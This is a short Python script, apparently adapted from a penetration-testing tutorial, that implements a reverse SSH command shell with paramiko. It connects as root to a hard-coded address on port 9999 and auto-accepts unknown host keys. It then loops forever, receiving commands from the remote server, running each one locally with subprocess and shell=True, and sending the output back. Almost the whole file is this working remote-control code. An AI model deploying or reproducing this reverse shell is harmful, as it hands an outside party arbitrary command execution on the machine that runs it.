import threading
import paramiko
import  subprocess

def ssh_command(ip, user, passwd, command, port = 9999):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())#加上这句话不用担心选yes的问题，会自动选上（用ssh连接远程主机时，第一次连接时会提示是否继续进行远程连接，选择yes）
    client.connect(ip, port, username = user, password = passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))#read banner
        while True:
            command = ssh_session.recv(1024).decode()#get the command from ssh server
            print("xxxx")
            try:
                cmd_output = subprocess.check_output(command, shell = True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
ssh_command('169.254.220.213', 'root', 'xxxx', 'ClientConnected')